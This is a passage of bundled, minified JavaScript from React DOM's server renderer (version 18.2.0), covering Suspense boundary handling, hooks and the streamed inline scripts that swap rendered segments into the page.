                case "suppressContentEditableWarning":
                case "suppressHydrationWarning":
                  break;
                default:
                  ja(m) && typeof h != "function" && typeof h != "symbol" && a.push(" ", m, '="', v(h), '"');
              }
          return a.push(">"), y(a, g, e), e;
      }
    }
    function za(a, b, c) {
      if (a.push('<!--$?--><template id="'), c === null)
        throw Error(l(395));
      return a.push(c), a.push('"></template>');
    }
    function Aa(a, b, c, d) {
      switch (c.insertionMode) {
        case 0:
        case 1:
          return a.push('<div hidden id="'), a.push(b.segmentPrefix), b = d.toString(16), a.push(b), a.push('">');
        case 2:
          return a.push('<svg aria-hidden="true" style="display:none" id="'), a.push(b.segmentPrefix), b = d.toString(16), a.push(b), a.push('">');
        case 3:
          return a.push('<math aria-hidden="true" style="display:none" id="'), a.push(b.segmentPrefix), b = d.toString(16), a.push(b), a.push('">');
        case 4:
          return a.push('<table hidden id="'), a.push(b.segmentPrefix), b = d.toString(16), a.push(b), a.push('">');
        case 5:
          return a.push('<table hidden><tbody id="'), a.push(b.segmentPrefix), b = d.toString(16), a.push(b), a.push('">');
        case 6:
          return a.push('<table hidden><tr id="'), a.push(b.segmentPrefix), b = d.toString(16), a.push(b), a.push('">');
        case 7:
          return a.push('<table hidden><colgroup id="'), a.push(b.segmentPrefix), b = d.toString(16), a.push(b), a.push('">');
        default:
          throw Error(l(397));
      }
    }
    function Ba(a, b) {
      switch (b.insertionMode) {
        case 0:
        case 1:
          return a.push("</div>");
        case 2:
          return a.push("</svg>");
        case 3:
          return a.push("</math>");
        case 4:
          return a.push("</table>");
        case 5:
          return a.push("</tbody></table>");
        case 6:
          return a.push("</tr></table>");
        case 7:
          return a.push("</colgroup></table>");
        default:
          throw Error(l(397));
      }
    }
    var Ca = /[<\u2028\u2029]/g;
    function Da(a) {
      return JSON.stringify(a).replace(Ca, function(a2) {
        switch (a2) {
          case "<":
            return "\\u003c";
          case "\u2028":
            return "\\u2028";
          case "\u2029":
            return "\\u2029";
          default:
            throw Error("escapeJSStringsForInstructionScripts encountered a match it does not know how to replace. this means the match regex and the replacement characters are no longer in sync. This is a bug in React");
        }
      });
    }
    function Ea(a, b) {
      return b = b === void 0 ? "" : b, { bootstrapChunks: [], startInlineScript: "<script>", placeholderPrefix: b + "P:", segmentPrefix: b + "S:", boundaryPrefix: b + "B:", idPrefix: b, nextSuspenseID: 0, sentCompleteSegmentFunction: !1, sentCompleteBoundaryFunction: !1, sentClientRenderFunction: !1, generateStaticMarkup: a };
    }
    function Fa(a, b, c, d) {
      return c.generateStaticMarkup ? (a.push(v(b)), !1) : (b === "" ? a = d : (d && a.push("<!-- -->"), a.push(v(b)), a = !0), a);
    }
    var B = Object.assign, Ga = Symbol.for("react.element"), Ha = Symbol.for("react.portal"), Ia = Symbol.for("react.fragment"), Ja = Symbol.for("react.strict_mode"), Ka = Symbol.for("react.profiler"), La = Symbol.for("react.provider"), Ma = Symbol.for("react.context"), Na = Symbol.for("react.forward_ref"), Oa = Symbol.for("react.suspense"), Pa = Symbol.for("react.suspense_list"), Qa = Symbol.for("react.memo"), Ra = Symbol.for("react.lazy"), Sa = Symbol.for("react.scope"), Ta = Symbol.for("react.debug_trace_mode"), Ua = Symbol.for("react.legacy_hidden"), Va = Symbol.for("react.default_value"), Wa = Symbol.iterator;
    function Xa(a) {
      if (a == null)
        return null;
      if (typeof a == "function")
        return a.displayName || a.name || null;
      if (typeof a == "string")
        return a;
      switch (a) {
        case Ia:
          return "Fragment";
        case Ha:
          return "Portal";
        case Ka:
          return "Profiler";
        case Ja:
          return "StrictMode";
        case Oa:
          return "Suspense";
        case Pa:
          return "SuspenseList";
      }
      if (typeof a == "object")
        switch (a.$$typeof) {
          case Ma:
            return (a.displayName || "Context") + ".Consumer";
          case La:
            return (a._context.displayName || "Context") + ".Provider";
          case Na:
            var b = a.render;
            return a = a.displayName, a || (a = b.displayName || b.name || "", a = a !== "" ? "ForwardRef(" + a + ")" : "ForwardRef"), a;
          case Qa:
            return b = a.displayName || null, b !== null ? b : Xa(a.type) || "Memo";
          case Ra:
            b = a._payload, a = a._init;
            try {
              return Xa(a(b));
            } catch {
            }
        }
      return null;
    }
    var Ya = {};
    function Za(a, b) {
      if (a = a.contextTypes, !a)
        return Ya;
      var c = {}, d;
      for (d in a)
        c[d] = b[d];
      return c;
    }
    var E = null;
    function F(a, b) {
      if (a !== b) {
        a.context._currentValue2 = a.parentValue, a = a.parent;
        var c = b.parent;
        if (a === null) {
          if (c !== null)
            throw Error(l(401));
        } else {
          if (c === null)
            throw Error(l(401));
          F(a, c);
        }
        b.context._currentValue2 = b.value;
      }
    }
    function $a(a) {
      a.context._currentValue2 = a.parentValue, a = a.parent, a !== null && $a(a);
    }
    function ab(a) {
      var b = a.parent;
      b !== null && ab(b), a.context._currentValue2 = a.value;
    }
    function bb(a, b) {
      if (a.context._currentValue2 = a.parentValue, a = a.parent, a === null)
        throw Error(l(402));
      a.depth === b.depth ? F(a, b) : bb(a, b);
    }
    function cb(a, b) {
      var c = b.parent;
      if (c === null)
        throw Error(l(402));
      a.depth === c.depth ? F(a, c) : cb(a, c), b.context._currentValue2 = b.value;
    }
    function G(a) {
      var b = E;
      b !== a && (b === null ? ab(a) : a === null ? $a(b) : b.depth === a.depth ? F(b, a) : b.depth > a.depth ? bb(b, a) : cb(b, a), E = a);
    }
    var db = { isMounted: function() {
      return !1;
    }, enqueueSetState: function(a, b) {
      a = a._reactInternals, a.queue !== null && a.queue.push(b);
    }, enqueueReplaceState: function(a, b) {
      a = a._reactInternals, a.replace = !0, a.queue = [b];
    }, enqueueForceUpdate: function() {
    } };
    function eb(a, b, c, d) {
      var f = a.state !== void 0 ? a.state : null;
      a.updater = db, a.props = c, a.state = f;
      var e = { queue: [], replace: !1 };
      a._reactInternals = e;
      var g = b.contextType;
      if (a.context = typeof g == "object" && g !== null ? g._currentValue2 : d, g = b.getDerivedStateFromProps, typeof g == "function" && (g = g(c, f), f = g == null ? f : B({}, f, g), a.state = f), typeof b.getDerivedStateFromProps != "function" && typeof a.getSnapshotBeforeUpdate != "function" && (typeof a.UNSAFE_componentWillMount == "function" || typeof a.componentWillMount == "function"))
        if (b = a.state, typeof a.componentWillMount == "function" && a.componentWillMount(), typeof a.UNSAFE_componentWillMount == "function" && a.UNSAFE_componentWillMount(), b !== a.state && db.enqueueReplaceState(a, a.state, null), e.queue !== null && 0 < e.queue.length)
          if (b = e.queue, g = e.replace, e.queue = null, e.replace = !1, g && b.length === 1)
            a.state = b[0];
          else {
            for (e = g ? b[0] : a.state, f = !0, g = g ? 1 : 0; g < b.length; g++) {
              var h = b[g];
              h = typeof h == "function" ? h.call(a, e, c, d) : h, h != null && (f ? (f = !1, e = B({}, e, h)) : B(e, h));
            }
            a.state = e;
          }
        else
          e.queue = null;
    }
    var fb = { id: 1, overflow: "" };
    function gb(a, b, c) {
      var d = a.id;
      a = a.overflow;
      var f = 32 - H(d) - 1;
      d &= ~(1 << f), c += 1;
      var e = 32 - H(b) + f;
      if (30 < e) {
        var g = f - f % 5;
        return e = (d & (1 << g) - 1).toString(32), d >>= g, f -= g, { id: 1 << 32 - H(b) + f | c << f | d, overflow: e + a };
      }
      return { id: 1 << e | c << f | d, overflow: a };
    }
    var H = Math.clz32 ? Math.clz32 : hb, ib = Math.log, jb = Math.LN2;
    function hb(a) {
      return a >>>= 0, a === 0 ? 32 : 31 - (ib(a) / jb | 0) | 0;
    }
    function kb(a, b) {
      return a === b && (a !== 0 || 1 / a === 1 / b) || a !== a && b !== b;
    }
    var lb = typeof Object.is == "function" ? Object.is : kb, I = null, ob = null, J = null, K = null, L = !1, M = !1, N = 0, O = null, P = 0;
    function Q() {
      if (I === null)
        throw Error(l(321));
      return I;
    }
    function pb() {
      if (0 < P)
        throw Error(l(312));
      return { memoizedState: null, queue: null, next: null };
    }
    function qb() {
      return K === null ? J === null ? (L = !1, J = K = pb()) : (L = !0, K = J) : K.next === null ? (L = !1, K = K.next = pb()) : (L = !0, K = K.next), K;
    }
    function rb() {
      ob = I = null, M = !1, J = null, P = 0, K = O = null;
    }
    function sb(a, b) {
      return typeof b == "function" ? b(a) : b;
    }
    function tb(a, b, c) {
      if (I = Q(), K = qb(), L) {
        var d = K.queue;
        if (b = d.dispatch, O !== null && (c = O.get(d), c !== void 0)) {
          O.delete(d), d = K.memoizedState;
          do
            d = a(d, c.action), c = c.next;
          while (c !== null);
          return K.memoizedState = d, [d, b];
        }
        return [K.memoizedState, b];
      }
      return a = a === sb ? typeof b == "function" ? b() : b : c !== void 0 ? c(b) : b, K.memoizedState = a, a = K.queue = { last: null, dispatch: null }, a = a.dispatch = ub.bind(null, I, a), [K.memoizedState, a];
    }
    function vb(a, b) {
      if (I = Q(), K = qb(), b = b === void 0 ? null : b, K !== null) {
        var c = K.memoizedState;
        if (c !== null && b !== null) {
          var d = c[1];
          a:
            if (d === null)
              d = !1;
            else {
              for (var f = 0; f < d.length && f < b.length; f++)
                if (!lb(b[f], d[f])) {
                  d = !1;
                  break a;
                }
              d = !0;
            }
          if (d)
            return c[0];
        }
      }
      return a = a(), K.memoizedState = [a, b], a;
    }
    function ub(a, b, c) {
      if (25 <= P)
        throw Error(l(301));
      if (a === I)
        if (M = !0, a = { action: c, next: null }, O === null && (O = /* @__PURE__ */ new Map()), c = O.get(b), c === void 0)
          O.set(b, a);
        else {
          for (b = c; b.next !== null; )
            b = b.next;
          b.next = a;
        }
    }
    function wb() {
      throw Error(l(394));
    }
    function R() {
    }
    var xb = { readContext: function(a) {
      return a._currentValue2;
    }, useContext: function(a) {
      return Q(), a._currentValue2;
    }, useMemo: vb, useReducer: tb, useRef: function(a) {
      I = Q(), K = qb();
      var b = K.memoizedState;
      return b === null ? (a = { current: a }, K.memoizedState = a) : b;
    }, useState: function(a) {
      return tb(sb, a);
    }, useInsertionEffect: R, useLayoutEffect: function() {
    }, useCallback: function(a, b) {
      return vb(function() {
        return a;
      }, b);
    }, useImperativeHandle: R, useEffect: R, useDebugValue: R, useDeferredValue: function(a) {
      return Q(), a;
    }, useTransition: function() {
      return Q(), [
        !1,
        wb
      ];
    }, useId: function() {
      var a = ob.treeContext, b = a.overflow;
      a = a.id, a = (a & ~(1 << 32 - H(a) - 1)).toString(32) + b;
      var c = S;
      if (c === null)
        throw Error(l(404));
      return b = N++, a = ":" + c.idPrefix + "R" + a, 0 < b && (a += "H" + b.toString(32)), a + ":";
    }, useMutableSource: function(a, b) {
      return Q(), b(a._source);
    }, useSyncExternalStore: function(a, b, c) {
      if (c === void 0)
        throw Error(l(407));
      return c();
    } }, S = null, yb = aa.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED.ReactCurrentDispatcher;
    function zb(a) {
      return console.error(a), null;
    }
    function T() {
    }
    function Ab(a, b, c, d, f, e, g, h, k) {
      var m = [], n = /* @__PURE__ */ new Set();
      return b = { destination: null, responseState: b, progressiveChunkSize: d === void 0 ? 12800 : d, status: 0, fatalError: null, nextSegmentId: 0, allPendingTasks: 0, pendingRootTasks: 0, completedRootSegment: null, abortableTasks: n, pingedTasks: m, clientRenderedBoundaries: [], completedBoundaries: [], partialBoundaries: [], onError: f === void 0 ? zb : f, onAllReady: e === void 0 ? T : e, onShellReady: g === void 0 ? T : g, onShellError: h === void 0 ? T : h, onFatalError: k === void 0 ? T : k }, c = U(b, 0, null, c, !1, !1), c.parentFlushed = !0, a = Bb(b, a, null, c, n, Ya, null, fb), m.push(a), b;
    }
    function Bb(a, b, c, d, f, e, g, h) {
      a.allPendingTasks++, c === null ? a.pendingRootTasks++ : c.pendingTasks++;
      var k = { node: b, ping: function() {
        var b2 = a.pingedTasks;
        b2.push(k), b2.length === 1 && Cb(a);
      }, blockedBoundary: c, blockedSegment: d, abortSet: f, legacyContext: e, context: g, treeContext: h };
      return f.add(k), k;
    }
    function U(a, b, c, d, f, e) {
      return { status: 0, id: -1, index: b, parentFlushed: !1, chunks: [], children: [], formatContext: d, boundary: c, lastPushedText: f, textEmbedded: e };
    }
    function V(a, b) {
      if (a = a.onError(b), a != null && typeof a != "string")
        throw Error('onError returned something with a type other than "string". onError should return a string and may return null or undefined but must not return anything else. It received something of type "' + typeof a + '" instead');
      return a;
    }
    function W(a, b) {
      var c = a.onShellError;
      c(b), c = a.onFatalError, c(b), a.destination !== null ? (a.status = 2, a.destination.destroy(b)) : (a.status = 1, a.fatalError = b);
    }
    function Db(a, b, c, d, f) {
      for (I = {}, ob = b, N = 0, a = c(d, f); M; )
        M = !1, N = 0, P += 1, K = null, a = c(d, f);
      return rb(), a;
    }
    function Eb(a, b, c, d) {
      var f = c.render(), e = d.childContextTypes;
      if (e != null) {
        var g = b.legacyContext;
        if (typeof c.getChildContext != "function")
          d = g;
        else {
          c = c.getChildContext();
          for (var h in c)
            if (!(h in e))
              throw Error(l(108, Xa(d) || "Unknown", h));
          d = B({}, g, c);
        }
        b.legacyContext = d, X(a, b, f), b.legacyContext = g;
      } else
        X(a, b, f);
    }
    function Fb(a, b) {
      if (a && a.defaultProps) {
        b = B({}, b), a = a.defaultProps;
        for (var c in a)
          b[c] === void 0 && (b[c] = a[c]);
        return b;
      }
      return b;
    }
    function Gb(a, b, c, d, f) {
      if (typeof c == "function")
        if (c.prototype && c.prototype.isReactComponent) {
          f = Za(c, b.legacyContext);
          var e = c.contextType;
          e = new c(d, typeof e == "object" && e !== null ? e._currentValue2 : f), eb(e, c, d, f), Eb(a, b, e, c);
        } else {
          e = Za(c, b.legacyContext), f = Db(a, b, c, d, e);
          var g = N !== 0;
          if (typeof f == "object" && f !== null && typeof f.render == "function" && f.$$typeof === void 0)
            eb(f, c, d, e), Eb(a, b, f, c);
          else if (g) {
            d = b.treeContext, b.treeContext = gb(d, 1, 0);
            try {
              X(a, b, f);
            } finally {
              b.treeContext = d;
            }
          } else
            X(a, b, f);
        }
      else if (typeof c == "string") {
        switch (f = b.blockedSegment, e = ya(f.chunks, c, d, a.responseState, f.formatContext), f.lastPushedText = !1, g = f.formatContext, f.formatContext = ra(g, c, d), Hb(a, b, e), f.formatContext = g, c) {
          case "area":
          case "base":
          case "br":
          case "col":
          case "embed":
          case "hr":
          case "img":
          case "input":
          case "keygen":
          case "link":
          case "meta":
          case "param":
          case "source":
          case "track":
          case "wbr":
            break;
          default:
            f.chunks.push("</", c, ">");
        }
        f.lastPushedText = !1;
      } else {
        switch (c) {
          case Ua:
          case Ta:
          case Ja:
          case Ka:
          case Ia:
            X(a, b, d.children);
            return;
          case Pa:
            X(a, b, d.children);
            return;
          case Sa:
            throw Error(l(343));
          case Oa:
            a: {
              c = b.blockedBoundary, f = b.blockedSegment, e = d.fallback, d = d.children, g = /* @__PURE__ */ new Set();
              var h = { id: null, rootSegmentID: -1, parentFlushed: !1, pendingTasks: 0, forceClientRender: !1, completedSegments: [], byteSize: 0, fallbackAbortableTasks: g, errorDigest: null }, k = U(a, f.chunks.length, h, f.formatContext, !1, !1);
              f.children.push(k), f.lastPushedText = !1;
              var m = U(a, 0, null, f.formatContext, !1, !1);
              m.parentFlushed = !0, b.blockedBoundary = h, b.blockedSegment = m;
              try {
                if (Hb(
                  a,
                  b,
                  d
                ), a.responseState.generateStaticMarkup || m.lastPushedText && m.textEmbedded && m.chunks.push("<!-- -->"), m.status = 1, Y(h, m), h.pendingTasks === 0)
                  break a;
              } catch (n) {
                m.status = 4, h.forceClientRender = !0, h.errorDigest = V(a, n);
              } finally {
                b.blockedBoundary = c, b.blockedSegment = f;
              }
              b = Bb(a, e, c, k, g, b.legacyContext, b.context, b.treeContext), a.pingedTasks.push(b);
            }
            return;
        }
        if (typeof c == "object" && c !== null)
          switch (c.$$typeof) {
            case Na:
              if (d = Db(a, b, c.render, d, f), N !== 0) {
                c = b.treeContext, b.treeContext = gb(c, 1, 0);
                try {
                  X(a, b, d);
                } finally {
                  b.treeContext = c;
                }
              } else
                X(a, b, d);
              return;
            case Qa:
              c = c.type, d = Fb(c, d), Gb(a, b, c, d, f);
              return;
            case La:
              if (f = d.children, c = c._context, d = d.value, e = c._currentValue2, c._currentValue2 = d, g = E, E = d = { parent: g, depth: g === null ? 0 : g.depth + 1, context: c, parentValue: e, value: d }, b.context = d, X(a, b, f), a = E, a === null)
                throw Error(l(403));
              d = a.parentValue, a.context._currentValue2 = d === Va ? a.context._defaultValue : d, a = E = a.parent, b.context = a;
              return;
            case Ma:
              d = d.children, d = d(c._currentValue2), X(a, b, d);
              return;
            case Ra:
              f = c._init, c = f(c._payload), d = Fb(c, d), Gb(
                a,
                b,
                c,
                d,
                void 0
              );
              return;
          }
        throw Error(l(130, c == null ? c : typeof c, ""));
      }
    }
    function X(a, b, c) {
      if (b.node = c, typeof c == "object" && c !== null) {
        switch (c.$$typeof) {
          case Ga:
            Gb(a, b, c.type, c.props, c.ref);
            return;
          case Ha:
            throw Error(l(257));
          case Ra:
            var d = c._init;
            c = d(c._payload), X(a, b, c);
            return;
        }
        if (qa(c)) {
          Ib(a, b, c);
          return;
        }
        if (c === null || typeof c != "object" ? d = null : (d = Wa && c[Wa] || c["@@iterator"], d = typeof d == "function" ? d : null), d && (d = d.call(c))) {
          if (c = d.next(), !c.done) {
            var f = [];
            do
              f.push(c.value), c = d.next();
            while (!c.done);
            Ib(a, b, f);
          }
          return;
        }
        throw a = Object.prototype.toString.call(c), Error(l(31, a === "[object Object]" ? "object with keys {" + Object.keys(c).join(", ") + "}" : a));
      }
      typeof c == "string" ? (d = b.blockedSegment, d.lastPushedText = Fa(b.blockedSegment.chunks, c, a.responseState, d.lastPushedText)) : typeof c == "number" && (d = b.blockedSegment, d.lastPushedText = Fa(b.blockedSegment.chunks, "" + c, a.responseState, d.lastPushedText));
    }
    function Ib(a, b, c) {
      for (var d = c.length, f = 0; f < d; f++) {
        var e = b.treeContext;
        b.treeContext = gb(e, d, f);
        try {
          Hb(a, b, c[f]);
        } finally {
          b.treeContext = e;
        }
      }
    }
    function Hb(a, b, c) {
      var d = b.blockedSegment.formatContext, f = b.legacyContext, e = b.context;
      try {
        return X(a, b, c);
      } catch (k) {
        if (rb(), typeof k == "object" && k !== null && typeof k.then == "function") {
          c = k;
          var g = b.blockedSegment, h = U(a, g.chunks.length, null, g.formatContext, g.lastPushedText, !0);
          g.children.push(h), g.lastPushedText = !1, a = Bb(a, b.node, b.blockedBoundary, h, b.abortSet, b.legacyContext, b.context, b.treeContext).ping, c.then(a, a), b.blockedSegment.formatContext = d, b.legacyContext = f, b.context = e, G(e);
        } else
          throw b.blockedSegment.formatContext = d, b.legacyContext = f, b.context = e, G(e), k;
      }
    }
    function Jb(a) {
      var b = a.blockedBoundary;
      a = a.blockedSegment, a.status = 3, Kb(this, b, a);
    }
    function Lb(a, b, c) {
      var d = a.blockedBoundary;
      a.blockedSegment.status = 3, d === null ? (b.allPendingTasks--, b.status !== 2 && (b.status = 2, b.destination !== null && b.destination.push(null))) : (d.pendingTasks--, d.forceClientRender || (d.forceClientRender = !0, a = c === void 0 ? Error(l(432)) : c, d.errorDigest = b.onError(a), d.parentFlushed && b.clientRenderedBoundaries.push(d)), d.fallbackAbortableTasks.forEach(function(a2) {
        return Lb(a2, b, c);
      }), d.fallbackAbortableTasks.clear(), b.allPendingTasks--, b.allPendingTasks === 0 && (d = b.onAllReady, d()));
    }
    function Y(a, b) {
      if (b.chunks.length === 0 && b.children.length === 1 && b.children[0].boundary === null) {
        var c = b.children[0];
        c.id = b.id, c.parentFlushed = !0, c.status === 1 && Y(a, c);
      } else
        a.completedSegments.push(b);
    }
    function Kb(a, b, c) {
      if (b === null) {
        if (c.parentFlushed) {
          if (a.completedRootSegment !== null)
            throw Error(l(389));
          a.completedRootSegment = c;
        }
        a.pendingRootTasks--, a.pendingRootTasks === 0 && (a.onShellError = T, b = a.onShellReady, b());
      } else
        b.pendingTasks--, b.forceClientRender || (b.pendingTasks === 0 ? (c.parentFlushed && c.status === 1 && Y(b, c), b.parentFlushed && a.completedBoundaries.push(b), b.fallbackAbortableTasks.forEach(Jb, a), b.fallbackAbortableTasks.clear()) : c.parentFlushed && c.status === 1 && (Y(b, c), b.completedSegments.length === 1 && b.parentFlushed && a.partialBoundaries.push(b)));
      a.allPendingTasks--, a.allPendingTasks === 0 && (a = a.onAllReady, a());
    }
    function Cb(a) {
      if (a.status !== 2) {
        var b = E, c = yb.current;
        yb.current = xb;
        var d = S;
        S = a.responseState;
        try {
          var f = a.pingedTasks, e;
          for (e = 0; e < f.length; e++) {
            var g = f[e], h = a, k = g.blockedSegment;
            if (k.status === 0) {
              G(g.context);
              try {
                X(h, g, g.node), h.responseState.generateStaticMarkup || k.lastPushedText && k.textEmbedded && k.chunks.push("<!-- -->"), g.abortSet.delete(g), k.status = 1, Kb(h, g.blockedBoundary, k);
              } catch (z) {
                if (rb(), typeof z == "object" && z !== null && typeof z.then == "function") {
                  var m = g.ping;
                  z.then(m, m);
                } else {
                  g.abortSet.delete(g), k.status = 4;
                  var n = g.blockedBoundary, q = z, C = V(h, q);
                  if (n === null ? W(h, q) : (n.pendingTasks--, n.forceClientRender || (n.forceClientRender = !0, n.errorDigest = C, n.parentFlushed && h.clientRenderedBoundaries.push(n))), h.allPendingTasks--, h.allPendingTasks === 0) {
                    var D = h.onAllReady;
                    D();
                  }
                }
              } finally {
              }
            }
          }
          f.splice(0, e), a.destination !== null && Mb(a, a.destination);
        } catch (z) {
          V(a, z), W(a, z);
        } finally {
          S = d, yb.current = c, c === xb && G(b);
        }
      }
    }
    function Z(a, b, c) {
      switch (c.parentFlushed = !0, c.status) {
        case 0:
          var d = c.id = a.nextSegmentId++;
          return c.lastPushedText = !1, c.textEmbedded = !1, a = a.responseState, b.push('<template id="'), b.push(a.placeholderPrefix), a = d.toString(16), b.push(a), b.push('"></template>');
        case 1:
          c.status = 2;
          var f = !0;
          d = c.chunks;
          var e = 0;
          c = c.children;
          for (var g = 0; g < c.length; g++) {
            for (f = c[g]; e < f.index; e++)
              b.push(d[e]);
            f = Nb(a, b, f);
          }
          for (; e < d.length - 1; e++)
            b.push(d[e]);
          return e < d.length && (f = b.push(d[e])), f;
        default:
          throw Error(l(390));
      }
    }
    function Nb(a, b, c) {
      var d = c.boundary;
      if (d === null)
        return Z(a, b, c);
      if (d.parentFlushed = !0, d.forceClientRender)
        return a.responseState.generateStaticMarkup || (d = d.errorDigest, b.push("<!--$!-->"), b.push("<template"), d && (b.push(' data-dgst="'), d = v(d), b.push(d), b.push('"')), b.push("></template>")), Z(a, b, c), a = a.responseState.generateStaticMarkup ? !0 : b.push("<!--/$-->"), a;
      if (0 < d.pendingTasks) {
        d.rootSegmentID = a.nextSegmentId++, 0 < d.completedSegments.length && a.partialBoundaries.push(d);
        var f = a.responseState, e = f.nextSuspenseID++;
        return f = f.boundaryPrefix + e.toString(16), d = d.id = f, za(b, a.responseState, d), Z(a, b, c), b.push("<!--/$-->");
      }
      if (d.byteSize > a.progressiveChunkSize)
        return d.rootSegmentID = a.nextSegmentId++, a.completedBoundaries.push(d), za(b, a.responseState, d.id), Z(a, b, c), b.push("<!--/$-->");
      if (a.responseState.generateStaticMarkup || b.push("<!--$-->"), c = d.completedSegments, c.length !== 1)
        throw Error(l(391));
      return Nb(a, b, c[0]), a = a.responseState.generateStaticMarkup ? !0 : b.push("<!--/$-->"), a;
    }
    function Ob(a, b, c) {
      return Aa(b, a.responseState, c.formatContext, c.id), Nb(a, b, c), Ba(b, c.formatContext);
    }
    function Pb(a, b, c) {
      for (var d = c.completedSegments, f = 0; f < d.length; f++)
        Qb(a, b, c, d[f]);
      if (d.length = 0, a = a.responseState, d = c.id, c = c.rootSegmentID, b.push(a.startInlineScript), a.sentCompleteBoundaryFunction ? b.push('$RC("') : (a.sentCompleteBoundaryFunction = !0, b.push('function $RC(a,b){a=document.getElementById(a);b=document.getElementById(b);b.parentNode.removeChild(b);if(a){a=a.previousSibling;var f=a.parentNode,c=a.nextSibling,e=0;do{if(c&&8===c.nodeType){var d=c.data;if("/$"===d)if(0===e)break;else e--;else"$"!==d&&"$?"!==d&&"$!"!==d||e++}d=c.nextSibling;f.removeChild(c);c=d}while(c);for(;b.firstChild;)f.insertBefore(b.firstChild,c);a.data="$";a._reactRetry&&a._reactRetry()}};$RC("')), d === null)
        throw Error(l(395));
      return c = c.toString(16), b.push(d), b.push('","'), b.push(a.segmentPrefix), b.push(c), b.push('")</script>');
    }
    function Qb(a, b, c, d) {
      if (d.status === 2)
        return !0;
      var f = d.id;
      if (f === -1) {
        if ((d.id = c.rootSegmentID) === -1)
          throw Error(l(392));
        return Ob(a, b, d);
      }
      return Ob(a, b, d), a = a.responseState, b.push(a.startInlineScript), a.sentCompleteSegmentFunction ? b.push('$RS("') : (a.sentCompleteSegmentFunction = !0, b.push('function $RS(a,b){a=document.getElementById(a);b=document.getElementById(b);for(a.parentNode.removeChild(a);a.firstChild;)b.parentNode.insertBefore(a.firstChild,b);b.parentNode.removeChild(b)};$RS("')), b.push(a.segmentPrefix), f = f.toString(16), b.push(f), b.push('","'), b.push(a.placeholderPrefix), b.push(f), b.push('")</script>');
    }
    function Mb(a, b) {
      try {
        var c = a.completedRootSegment;
        if (c !== null && a.pendingRootTasks === 0) {
          Nb(a, b, c), a.completedRootSegment = null;
          var d = a.responseState.bootstrapChunks;
          for (c = 0; c < d.length - 1; c++)
            b.push(d[c]);
          c < d.length && b.push(d[c]);
        }
        var f = a.clientRenderedBoundaries, e;
        for (e = 0; e < f.length; e++) {
          var g = f[e];
          d = b;
          var h = a.responseState, k = g.id, m = g.errorDigest, n = g.errorMessage, q = g.errorComponentStack;
          if (d.push(h.startInlineScript), h.sentClientRenderFunction ? d.push('$RX("') : (h.sentClientRenderFunction = !0, d.push('function $RX(b,c,d,e){var a=document.getElementById(b);a&&(b=a.previousSibling,b.data="$!",a=a.dataset,c&&(a.dgst=c),d&&(a.msg=d),e&&(a.stck=e),b._reactRetry&&b._reactRetry())};$RX("')), k === null)
            throw Error(l(395));
          if (d.push(k), d.push('"'), m || n || q) {
            d.push(",");
            var C = Da(m || "");
            d.push(C);
          }
          if (n || q) {
            d.push(",");
            var D = Da(n || "");
            d.push(D);
          }
          if (q) {
            d.push(",");
            var z = Da(q);
            d.push(z);
          }
          if (!d.push(")</script>")) {
            a.destination = null, e++, f.splice(0, e);
            return;
          }
        }
        f.splice(0, e);
        var ba = a.completedBoundaries;
        for (e = 0; e < ba.length; e++)
          if (!Pb(a, b, ba[e])) {
            a.destination = null, e++, ba.splice(0, e);
            return;
          }
        ba.splice(0, e);
        var ca = a.partialBoundaries;
        for (e = 0; e < ca.length; e++) {
          var mb = ca[e];
          a: {
            f = a, g = b;
            var da = mb.completedSegments;
            for (h = 0; h < da.length; h++)
              if (!Qb(f, g, mb, da[h])) {
                h++, da.splice(0, h);
                var nb = !1;
                break a;
              }
            da.splice(0, h), nb = !0;
          }
          if (!nb) {
            a.destination = null, e++, ca.splice(0, e);
            return;
          }
        }
        ca.splice(0, e);
        var ea = a.completedBoundaries;
        for (e = 0; e < ea.length; e++)
          if (!Pb(a, b, ea[e])) {
            a.destination = null, e++, ea.splice(0, e);
            return;
          }
        ea.splice(0, e);
      } finally {
        a.allPendingTasks === 0 && a.pingedTasks.length === 0 && a.clientRenderedBoundaries.length === 0 && a.completedBoundaries.length === 0 && b.push(null);
      }
    }
    function Rb(a, b) {
      try {
        var c = a.abortableTasks;
        c.forEach(function(c2) {
          return Lb(c2, a, b);
        }), c.clear(), a.destination !== null && Mb(a, a.destination);
      } catch (d) {
        V(a, d), W(a, d);
      }
    }
    function Sb() {
    }
    function Tb(a, b, c, d) {
      var f = !1, e = null, g = "", h = { push: function(a2) {
        return a2 !== null && (g += a2), !0;
      }, destroy: function(a2) {
        f = !0, e = a2;
      } }, k = !1;
      if (a = Ab(a, Ea(c, b ? b.identifierPrefix : void 0), { insertionMode: 1, selectedValue: null }, 1 / 0, Sb, void 0, function() {
        k = !0;
      }, void 0, void 0), Cb(a), Rb(a, d), a.status === 1)
        a.status = 2, h.destroy(a.fatalError);
      else if (a.status !== 2 && a.destination === null) {
        a.destination = h;
        try {
          Mb(a, h);
        } catch (m) {
          V(a, m), W(a, m);
        }
      }
      if (f)
        throw e;
      if (!k)
        throw Error(l(426));
      return g;
    }
    exports.renderToNodeStream = function() {
      throw Error(l(207));
    };
    exports.renderToStaticMarkup = function(a, b) {
      return Tb(a, b, !0, 'The server used "renderToStaticMarkup" which does not support Suspense. If you intended to have the server wait for the suspended component please switch to "renderToReadableStream" which supports Suspense on the server');
    };
    exports.renderToStaticNodeStream = function() {
      throw Error(l(208));
    };
    exports.renderToString = function(a, b) {
      return Tb(a, b, !1, 'The server used "renderToString" which does not support Suspense. If you intended for this Suspense boundary to render the fallback content on the server consider throwing an Error somewhere within the Suspense boundary. If you intended to have the server wait for the suspended component please switch to "renderToReadableStream" which supports Suspense on the server');
    };
    exports.version = "18.2.0";
  }
});

// node_modules/react-dom/cjs/react-dom-server.browser.production.min.js
var require_react_dom_server_browser_production_min = __commonJS({
  "node_modules/react-dom/cjs/react-dom-server.browser.production.min.js"(exports) {
    "use strict";
    var aa = require_react();
    function k(a) {
      for (var b = "https://reactjs.org/docs/error-decoder.html?invariant=" + a, c = 1; c < arguments.length; c++)
        b += "&args[]=" + encodeURIComponent(arguments[c]);
      return "Minified React error #" + a + "; visit " + b + " for the full message or use the non-minified dev environment for full errors and additional helpful warnings.";
    }
    var l = null, n = 0;
    function p(a, b) {
      if (b.length !== 0)
        if (512 < b.length)
          0 < n && (a.enqueue(new Uint8Array(l.buffer, 0, n)), l = new Uint8Array(512), n = 0), a.enqueue(b);
        else {
          var c = l.length - n;
